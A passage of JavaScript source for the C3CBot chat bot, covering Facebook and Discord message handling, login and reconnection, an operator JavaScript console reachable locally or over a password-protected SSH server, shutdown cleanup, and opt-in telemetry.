                        .replace("{0}", global.config.commandPrefix), message.threadID,
                      function (err) {
                        if (err) {
                          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                            facebookloggedIn = false;
                            process.exit(7378278);
                          }
                        }
                      }, null, message.isGroup
                    );
                    log("[Facebook]", message.author, "added Bot to", message.threadID);
                  }
                }
              } catch (ex) {
                log("[Facebook]", ex);
              }
              break;
            case "message_reaction":
              log("[Facebook]", message);
              break;
            case "message_unsend":
              log(
                "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                "deleted a message in " + message.threadID + ". (" + message.messageID + ")"
              );
              break;
            case "message_reply":
              !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
              global.deliveryFacebook[message.threadID].push(message.messageID);
              if (message.messageReply) {
                for (var xzxz in message.messageReply.attachments) {
                  if (message.messageReply.attachments[xzxz].error) {
                    fs.writeFileSync(
                      path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                      JSON.stringify(message, null, 4), {
                      mode: 0o666
                    }
                    );
                  }
                }
              }
              if (global.markAsReadFacebook[message.threadID]) {
                try {
                  clearTimeout(global.markAsReadFacebook[message.threadID]);
                } catch (ex) { }
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              } else {
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              }
              var argr = message.body.replace((/”/g), "\"")
                .replace((/“/g), "\"")
                .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                .filter(function (el) {
                  return !(el == null || el == "" || el == " ");
                });
              argr.map(xy => xy.replace(/["]/g, ""));
              if (argr.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
                .config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1
                ) && !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message
                  .senderID)))) {
                api.getThreadInfo(message.threadID, function (err, data) {
                  var participants = data.participantIDs;
                  var character = "@";
                  var sendString = "";
                  var mentionObj = [];
                  var i = 0;
                  for (var n in participants) {
                    sendString += character;
                    mentionObj.push({
                      tag: character,
                      id: participants[n],
                      fromIndex: i
                    });
                    i++;
                  }
                  api.sendMessage({
                    body: sendString,
                    mentions: mentionObj
                  }, message.threadID, function (err) {
                    if (err) {
                      log("[Facebook] @everyone errored:", err);
                    }
                  }, message.messageID, message.isGroup);
                });
              }
              try {
                let str = "";
                for (let n in message.attachments) {
                  let type = message.attachments[n].type;
                  type = type[0].toLocaleUpperCase() + type.substr(1);
                  str += "\r\n  <";
                  str += type;
                  str += " ";
                  switch (message.attachments[n].type) {
                    case "audio":
                    case "video":
                      // eslint-disable-next-line no-case-declarations
                      let dr = new Date(message.attachments[n].duration);
                      str += dr.getUTCHours()
                        .pad(2) + ":" + dr.getUTCMinutes()
                          .pad(2) + ":" + dr.getUTCSeconds()
                            .pad(2) + "." + dr.getUTCMilliseconds()
                              .pad(3);
                      str += " ";
                      if (message.attachments[n].type == "audio") break;
                    // eslint-disable-next-line no-fallthrough
                    case "photo":
                    case "animated_image":
                    case "sticker":
                      str += message.attachments[n].width;
                      str += "x";
                      str += message.attachments[n].height;
                      str += " ";
                  }
                  str += "| ";
                  str += message.attachments[n].url;
                  str += ">";
                }
                log(
                  "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                  "replied to", message.messageReply.senderID, "at", message.threadID + ":", message.body, str
                );
              } catch (ex) {
                log("[Facebook] ERROR on replymsg", message);
                fs.writeFileSync(
                  path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                  JSON.stringify(message, null, 4), {
                  mode: 0o666
                }
                );
              }
              break;
            default:
              break;
          }
        } else {
          log("[Facebook]", "Detected undefined!", err);
        }
      } catch (ex) {
        log("[Facebook]", ex, message);
      }
    });
    log("[Facebook]", "Started Facebook listener");
  };
  var fbloginobj = {};
  fbloginobj.email = global.config.fbemail;
  fbloginobj.password = global.config.fbpassword;
  if (global.config.usefbappstate && fs.existsSync(path.join(__dirname, "fbstate.json"))) {
    fbloginobj.appState = JSON.parse(fs.readFileSync(path.join(__dirname, "fbstate.json"), 'utf8'));
  }
  var configobj = {
    userAgent: global.config.fbuseragent,
    logLevel: global.config.DEBUG_FCA_LOGLEVEL,
    selfListen: true,
    listenEvents: true,
    updatePresence: false,
    autoMarkRead: false,
    autoMarkDelivery: false,
    forceLogin: false
  };
  if (global.config.facebookProxy != null) {
    if (global.config.facebookProxyUseSOCKS) {
      //configobj.proxy = "http://127.0.0.1:2813";
      configobj.proxy = `http://${sock2httpAddress == "0.0.0.0" ? "127.0.0.1" : sock2httpAddress}:${sock2httpPort}`;
    } else {
      configobj.proxy = "http://" + global.config.facebookProxy;
    }
  }
  try {
    log("[Facebook]", "Logging in...");
    var _fbinstance = require("fca-unofficial")(fbloginobj, configobj, facebookcb);
    var forceReconnect = function forceReconnect(error) {
      if (!error) {
        log("[Facebook]", "Destroying FCA instance and creating a new one...");
      }
      if (typeof facebook.listener == "object" && typeof facebook.listener.stopListening == "function") {
        facebook.listener.stopListening();
        log("[Facebook]", "Stopped Facebook listener");
      }
      if (typeof (facebook.api || {}).getAppState == "function") {
        var temporaryAppState = facebook.api.getAppState();
      } else {
        log("[Facebook]", "Cannot get appstate to reconnect (account not logged in?).");
        return;
      }
      try {
        clearInterval(facebook.removePendingClock);
        clearInterval(facebook.deliveryClock);
      } catch (ex) { }
      _fbinstance = null;
      delete require.cache[require.resolve("fca-unofficial")];
      _fbinstance = require("fca-unofficial")({
        appState: temporaryAppState
      }, configobj, facebookcb);
      log("[Facebook]", "New instance created.");
      log("[Facebook]", "Logging in...");
      setTimeout(function () {
        if (facebook.error && !facebook.listener) {
          log("[Facebook]", "Detected error. Attempting to reconnect...");
          forceReconnect(true);
        }
      }, 30000);
    };
    setInterval(forceReconnect, 64800000); //relogin every 18 hours
  } catch (ex) {
    log("[Facebook]", "Error found in codebase:", ex);
  }
}

var consoleHandle = function (message, SSH) {
  log("[INTERNAL]", `${SSH ? SSH : "CONSOLE"} issued javascript code:`, message);
  try {
    log(`[${SSH ? "SSH-" : ""}JAVASCRIPT]`, eval(message));
  } catch (ex) {
    log(`[${SSH ? "SSH-" : ""}JAVASCRIPT]`, ex);
  }
};
rl.on('line', function (message) {
  consoleHandle(message);
});
rl.setPrompt("console@c3c:js# ");
rl.prompt();

if (global.config.enableSSHRemoteConsole) {
  var ssh2 = require('ssh2');
  var hostkey = {};
  if (fs.existsSync(path.join(__dirname, "sshkey.json"))) {
    hostkey = JSON.parse(fs.readFileSync(path.join(__dirname, "sshkey.json"), {
      encoding: "utf8"
    }));
    log("[SSH]", "Loaded existing host key.");
  } else {
    hostkey = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      }
    });
    fs.writeFileSync(path.join(__dirname, "sshkey.json"), JSON.stringify(hostkey));
    log("[SSH]", "Generated new host key.");
  }
  global.ssh2server = new ssh2.Server({
    hostKeys: [hostkey.privateKey]
  }, function connListener(client, conninfo) {
    log("[SSH]", conninfo.ip + ":" + conninfo.port, "connected with client named", conninfo.header.versions
      .software);
    client.on('authentication', function (ctx) {
      var user = ctx.username;
      if (user.length !== global.config.sshUsername.length || !(user == global.config.sshUsername)) {
        log(
          "[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with wrong username (", user,
          ")"
        );
        return ctx.reject([], false);
      }
      switch (ctx.method) {
        case 'password':
          var password = ctx.password;
          if (password.length === global.config.sshPassword.length && password == global.config.sshPassword) {
            return ctx.accept();
          } else {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with wrong password.");
            return ctx.reject(["password"], false);
          }
        /* case 'publickey':
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with public keys, which is not supported.");
          return ctx.reject(); */
        default:
          log(
            "[SSH]", conninfo.ip + ":" + conninfo.port, "is authenticating with method:", ctx.method,
            ". Notifying client that a password is needed..."
          );
          return ctx.reject(["password"], true);
      }
    })
      .on('ready', function () {
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "authenticated successfully.");
        client.on('session', function (accept, _reject) {
          var session = accept();
          //SSH Shell
          session.once('shell', function (accept, _reject) {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, "requested a shell (Remote Console).");
            global.sshstream[conninfo.ip + ":" + conninfo.port] = accept();
            global.sshstream[conninfo.ip + ":" + conninfo.port].write('\u001B[2J\u001B[0;0f');
            global.sshstream[conninfo.ip + ":" + conninfo.port].write(global.config.botname + " v" +
              version + (global.config.botname != "C3CBot" ? " (Powered by C3C)" : ""));
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("https://github.com/lequanglam/c3c");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            var sshrl = readline.createInterface({
              input: global.sshstream[conninfo.ip + ":" + conninfo.port].stdin,
              output: global.sshstream[conninfo.ip + ":" + conninfo.port].stdout,
              terminal: true,
              prompt: ""
            });
            global.sshcurrsession[conninfo.ip + ":" + conninfo.port] = sshrl;
            sshrl.on('line', (message) => consoleHandle(message, conninfo.ip + ":" + conninfo.port));
            sshrl.setPrompt("ssh@c3c:js# ");
            sshrl.prompt();
            // process.stdout.pipe(stream, {end: false});
            // stream.pipe(process.stdin, {end: false});
          });

          session.on('pty', function (accept, _reject, info) {
            log(
              "[SSH]",
              conninfo.ip + ":" + conninfo.port,
              `requested PTY: ${info.cols}x${info.rows} (${info.width}x${info.height} px)`,
              Object.keys(info.modes).reduce((pv, cv) => {
                if (info.modes[cv]) {
                  if (pv == "") {
                    return cv;
                  }
                  return `${pv}, ${cv}`;
                }
                return pv;
              }, "")
            );
            accept();
          });

          session.on('window-change', function (accept, _reject, info) {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, `changed PTY size: ${info.cols}x${info.rows} (${info.width}x${info.height} px)`);
          });

          session.on('signal', function (accept, _reject, info) {
            accept();
            process.emit(info.name);
          });
        });
      })
      .on('end', function () {
        delete global.sshcurrsession[conninfo.ip + ":" + conninfo.port];
        delete global.sshstream[conninfo.ip + ":" + conninfo.port];
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "disconnected.");
      })
      .on('error', function (err) {
        log("[SSH]", "ERR!", err);
        delete global.sshcurrsession[conninfo.ip + ":" + conninfo.port];
        delete global.sshstream[conninfo.ip + ":" + conninfo.port];
      });
  })
    .on('error', function (err) {
      log("[SSH]", "ERR!", err);
    })
    .listen(global.config.sshRemoteConsolePort, global.config.sshRemoteConsoleIP, function () {
      log("[SSH]", "Listening for SSH connection at", this.address()
        .address + ":" + this.address()
          .port);
    });
}
typeof global.data.cacheName != "object" ? global.data.cacheName = {} : "";
if (typeof global.data.cacheNameExpires != "object") {
  global.data.cacheNameExpires = {};
  var currTime = Date.now();
  for (var n in global.data.cacheName) {
    global.data.cacheNameExpires[n] = currTime + 604800000; //cacheName expires in 7 days.
  }
}
typeof global.data.everyoneTagBlacklist != "object" ? global.data.everyoneTagBlacklist = {} : "";
var discordid = "Disabled";
if (global.config.enablediscord) {
  discordid = "Not logged in";
  var Discord = require('discord.js');
  global.Discord = Discord;
  client = new Discord.Client();
  client.on('ready', () => {
    log("[Discord]", "Logged in as", client.user.tag + ".");
    discordid = client.user.id;
  });
  client.on('error', error => {
    log("[Discord]", "Crashed with error: ", error);
    log("[Discord]", "Trying to reconnect... Some plugins might not work correctly.");
  });
  var discordMessageHandler = async function (message) {
    var nointernalresolve = false;
    var receivetime = new Date();
    for (var n in global.chatHook) {
      if (global.chatHook[n].listenplatform & 2) {
        var chhandling = global.chatHook[n];
        if (chhandling.listentype == "everything") {
          let admin = false;
          if (global.config.admins.indexOf("DC-" + message.author.id) != -1) {
            admin = true;
          }
          if (
            global.getType(chhandling.resolverFunc) == "Function" ||
            global.getType(chhandling.resolverFunc) == "AsyncFunction"
          ) {
            let chdata = chhandling.resolverFunc("Discord", {
              time: receivetime,
              msgdata: message,
              discordapi: client,
              // eslint-disable-next-line no-nested-ternary
              facebookapi: (typeof facebook == "object" ? (typeof facebook.api == "object" ? facebook
                .api : {}) : {}),
              prefix: prefix,
              admin: admin,
              // eslint-disable-next-line no-loop-func
              log: function logPlugin(...message) {
                log.apply(global, [
                  "[PLUGIN]",
                  "[" + String(chhandling.handler) + "]"
                ].concat(message));
              },
              // eslint-disable-next-line no-loop-func
              return: function returndata(returndata) {
                if (!returndata) return;
                if (returndata.handler == "internal" && typeof returndata.data == "string") {
                  message.reply((returndata.data || ""), {
                    split: true
                  });
                } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                  var body = returndata.data.body || "";
                  delete returndata.data.body;
                  returndata.data.split = true;
                  message.reply(body, returndata.data);
                }
              }
            });
            // eslint-disable-next-line no-await-in-loop
            if (global.getType(chdata) == "Promise") chdata = await chdata;
            nointernalresolve = (nointernalresolve || chdata === true);
          }
        }
      }
    }
    if (message.content.startsWith(global.config.commandPrefix) && !nointernalresolve) {
      if (((global.config.discordlistenwhitelist && global.config.discordlisten.indexOf(message.channel.id) != -1) ||
        (!global.config.discordlistenwhitelist && global.config.discordlisten.indexOf(message.channel.id) == -1)) &&
        !message.author.bot && !Object.prototype.hasOwnProperty.call(
          global.config.blacklistedUsers,
          ("DC-" + message.author.id)
        )) {
        log(
          "[Discord]", message.author.id, "(" + message.author.tag + ")", "issued command in", message.channel.id +
          " (" + message.channel.name + "):",
          message.content,
          (message.attachments.size > 0 ? message.attachments : "")
        );
        var currenttime = new Date();
        let arg = message.content.replace((/”/g), "\"")
          .replace((/“/g), "\"")
          .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
          .filter(function (el) {
            return !(el == null || el == "" || el == " ");
          })
          .map(xy => xy.replace(/"/g, ""));

        let admin = false;
        for (var no in global.config.admins) {
          if (global.config.admins[no] == "DC-" + message.author.id) {
            admin = true;
          }
        }
        if (global.commandMapping[arg[0].substr(1)]) {
          if (!(global.commandMapping[arg[0].substr(1)].compatibly & 2) && global.commandMapping[arg[0].substr(1)]
            .compatibly != 0) {
            message.reply(getLang("UNSUPPORTED_INTERFACE", "DC-" + message.author.id));
          } else {
            global.data.cacheName["DC-" + message.author.id] = message.author.tag;
            var mentions = {};
            message.mentions.users.forEach(function (y, x) {
              mentions["DC-" + x] = y;
              global.data.cacheName["DC-" + x] = y.username + "#" + y.discrimator;
            });
            var returndata = {};
            try {
              if (facebook) {
                if (!facebook.api) {
                  facebook.api = {};
                }
              } else {
                facebook = {};
                facebook.api = {};
              }
              returndata = global.commandMapping[arg[0].substr(1)].scope("Discord", {
                args: JSON.parse(JSON.stringify(arg)),
                time: currenttime,
                msgdata: message,
                prefix: prefix,
                admin: admin,
                mentions: mentions,
                discordapi: client,
                facebookapi: facebook.api,
                log: function logPlugin(...message) {
                  log.apply(global, [
                    "[PLUGIN]",
                    "[" + global.commandMapping[arg[0].substr(1)].handler + "]"
                  ].concat(message));
                },
                return: function returndata(returndata) {
                  if (!returndata) return;
                  if (returndata.handler == "internal" && typeof returndata.data == "string") {
                    message.reply((returndata.data || ""), {
                      split: true
                    });
                  } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                    var body = returndata.data.body || "";
                    delete returndata.data.body;
                    returndata.data.split = true;
                    message.reply(body, returndata.data);
                  }
                }
              });
              if (global.getType(returndata) == "Promise") returndata = await returndata;
            } catch (ex) {
              log("[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:", ex);
              returndata = {
                handler: "internal",
                data: "plerr: " + ex.stack
              };
            }
            if (typeof returndata == "object") {
              if (returndata.handler == "internal" && typeof returndata.data == "string") {
                message.reply((returndata.data || ""), {
                  split: true
                });
              } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                var body = returndata.data.body || "";
                delete returndata.data.body;
                returndata.data.split = true;
                message.reply(body, returndata.data);
              }
            } else if (typeof returndata != "undefined") {
              log("[Facebook]", "Received an unknown response from plugin:", returndata);
            }
          }
        } else {
          if (!global.config.hideUnknownCommandMessage) {
            var nearest = require("./nearAPI.js").findBestMatch(
              arg[0].slice(global.config.commandPrefix.length),
              Object.keys(global.commandMapping)
                .filter(v => (admin || !global.commandMapping[v].adminCmd))
                .filter(v => ((global.commandMapping[v].compatibly & 2) || (global.commandMapping[v].compatibly == 0)))
            ).bestMatch;
            message.reply(getLang("UNKNOWN_CMD", "DC-" + message.author.id).replace("{0}", global.config.commandPrefix) + (nearest.rating >= 0.3 ? `\n\n${getLang("UNKNOWN_CMD_DIDYOUMEAN", "DC-" + message.author.id).replace("{0}", '`' + global.config.commandPrefix + nearest.target + '`')}` : ""));
          }
        }
      } else {
        log(
          "[Discord]", message.author.id, "(" + message.author.tag + ")", (message.channel instanceof Discord
            .DMChannel ? "DMed:" : "messaged in channel " + message.channel.id + " (" + message.channel.name + "):"
        ), message.content, (message.attachments.size > 0 ? message.attachments : "")
        );
      }
    } else {
      log(
        "[Discord]", message.author.id, "(" + message.author.tag + ")", (message.channel instanceof Discord
          .DMChannel ? "DMed:" : "messaged in channel " + message.channel.id + " (" + message.channel.name + "):"),
        message.content, (message.attachments.size > 0 ? message.attachments : "")
      );
    }
  };
  client.on('message', discordMessageHandler);
  log("[Discord]", "Logging in...");
  client.login(global.config.discordtoken);
  global.config.discordtoken = "<REDACTED>";
}
//Handling exit
var shutdownHandler = function (errorlevel) {
  log("[INTERNAL]", "Detected process is shutting down, handling...");
  //Stop Facebook listener
  if (facebook.listener) {
    facebook.listener.stopListening();
    try {
      clearInterval(facebook.removePendingClock);
      clearInterval(facebook.deliveryClock);
    } catch (ex) { }
    log("[Facebook]", "Stopped Facebook listener");
  }
  //Stop Discord listener and destroy Discord client
  if (global.config.enablediscord) {
    client.removeListener('message', discordMessageHandler);
    log("[Discord]", "Stopped Discord listener");
    client.destroy();
    log("[Discord]", "Logged out and destroyed client.");
  }
  //Stop auto-saving
  try {
    clearInterval(autosave);
    log("[INTERNAL]", "Stopped auto-save.");
  } catch (ex) {
    log("[INTERNAL]", ex);
  }
  //Unload all plugins 
  unloadPlugin();

  //Save for the last time
  if (testmode) {
    fs.writeFileSync(path.join(__dirname, "data-test.json"), JSON.stringify(global.data, null, 4), {
      mode: 0o666
    });
  } else {
    fs.writeFileSync(path.join(__dirname, "data.json"), JSON.stringify(global.data, null, 4), {
      mode: 0o666
    });
  }
  log("[INTERNAL]", "Saved data.");
  //Logout if don't use appstates
  if (!global.config.usefbappstate && typeof facebook.api == "object" && typeof facebook.api.logout == "function" &&
    facebookloggedIn) {
    var err = wait.for.callback(facebook.api.logout);
    log("[Facebook]", "Logged out.", err);
  }
  //Delete appstate if not logged in
  if (!facebookloggedIn) {
    fs.unlinkSync(path.join(__dirname, "fbstate.json"));
  }
  //Close SSH connections
  for (var conn in global.sshstream) {
    try {
      global.sshstream[conn].close();
    } catch (ex) {
      log("[SSH]", conn, "is already closed. Skipping...");
    }
  }

  //Stop local SOCK2HTTP
  if (typeof localSocksProxy != "undefined") {
    localSocksProxy.close();
    log("[INTERNAL]", "Closed local SOCKS2HTTP proxy.");
  }
  log("[INTERNAL]", "Closing bot with code " + errorlevel + "..." + "\x1b[m\r\n");
  rl.setPrompt("\x1b[m");
  console.log();
};
//Handle SIGINT and SIGTERM
var signalHandler = function (signal) {
  log("[INTERNAL]", signal, "detected, triggering exit function...");
  process.exit();
};
process.on('SIGTERM', () => signalHandler("SIGTERM")); //Ctrl+C but not on Windows?
process.on('SIGINT', function () {
  signalHandler("SIGINT");
}); //Ctrl+C?
process.on('SIGHUP', function () {
  signalHandler("SIGHUP");
}); //Windows Command Prompt close button?
rl.on('SIGTERM', () => process.emit('SIGINT'));
rl.on('SIGINT', () => process.emit('SIGINT'));
process.on('exit', shutdownHandler);

if (global.config.enableMetric) {
  var { osName } = require("./getOSInfo.js");
  var metric = require("./metric.js");

  var fPing = function ping(func) {
    var send = {
      version,
      facebookid,
      discordid,
      ram: os.totalmem(),
      ostype: os.type(),
      osplatform: os.platform()
        .toString(),
      osrelease: os.release(),
      cpuarch: os.arch(),
      cpuload: (currentCPUPercentage * 100)
        .toFixed(0),
      botname: global.config.botname,
      prefix: global.config.commandPrefix,
      osname: osName,
      desc: fs.readFileSync(path.join(__dirname, "bot_description.txt"), {
        encoding: "utf8"
      }),
      admin: JSON.stringify(global.config.admins)
    };
    if (global.config.metricHideBotAccountLink) {
      send.hide = true;
    }
    if (process.env.PORT && global.config.herokuApplication != "") {
      send.heroku = true;
      send.herokuapp = global.config.herokuApplication;
    }
    return func(send);
  };

  var metricNewLogic = function metricNewLogic() {
    log("[Metric]", "Generating new Metric ID...");
    metric.createNew(version, global.config.metricHideBotAccountLink)
      .then(metricData => {
        log("[Metric]", `Generated new metric ID (${metricData.metricID})`);
        global.data.metricID = metricData.metricID;
        global.data.metricSecret = metricData.metricSecret;
        metric.authenticate(metricData.metricID, metricData.metricSecret)
          .then(ping => {
            fPing(ping)
              .then(function () {
                log("[Metric]", `Successfully ping Metric server with new Metric ID (${metricData.metricID}).`);
                setInterval(function (ping) {
                  fPing(ping)
                    .then(() => log(
                      "[Metric]",
                      `Successfully ping Metric server with Metric ID ${metricData.metricID}.`
                    ))
                    .catch(ret => {
                      var [err] = ret;
                      log("[Metric]", `Error while pinging with Metric ID ${metricData.metricID}`, err);
                    });
                }, 50000, ping);
              })
              .catch(ret => {
                var [err] = ret;
                log("[Metric]", "Error while pinging with new Metric ID & Secret:", err);
              });
          })
          .catch(ret => {
            var [err] = ret;
            log("[Metric]", "Error while authenticating with new Metric ID & Secret:", err);
          });
      })
      .catch(ret => {
        var [err] = ret;
        log("[Metric]", "Error while generating new Metric ID & Secret:", err);
      });
  };
  if (typeof global.data.metricID != "string" || typeof global.data.metricSecret != "string") {
    metricNewLogic();
  } else {
    var metricAuth = function () {
      metric.authenticate(global.data.metricID, global.data.metricSecret)
        .then(ping => {
          fPing(ping)
            .then(function () {
              log("[Metric]", `Successfully ping Metric server with Metric ID ${global.data.metricID}.`);
              setInterval(function (ping) {
                fPing(ping)
                  .then(() => log(
                    "[Metric]",
                    `Successfully ping Metric server with Metric ID ${global.data.metricID}.`
                  ))
                  .catch(ret => {
                    var [err] = ret;
                    log("[Metric]", `Error while pinging with Metric ID ${global.data.metricID}`, err);
                  });
              }, 50000, ping);
            })
            .catch(ret => {
              var [err] = ret;
              log("[Metric]", `Error while pinging with Metric ID ${global.data.metricID}:`, err);
            });
        })
        .catch(ret => {
          var [err, notneterr] = ret;
          log("[Metric]", `Error while authenticating with Metric ID ${global.data.metricID}:`, err);
          if (notneterr) {
            metricNewLogic();
          } else {
            log("[Metric]", `Reauthenticating with Metric ID ${global.data.metricID} because of network/server error.`);
            setTimeout(metricAuth, 0);
          }
        });
    };
    metricAuth();
  }
}
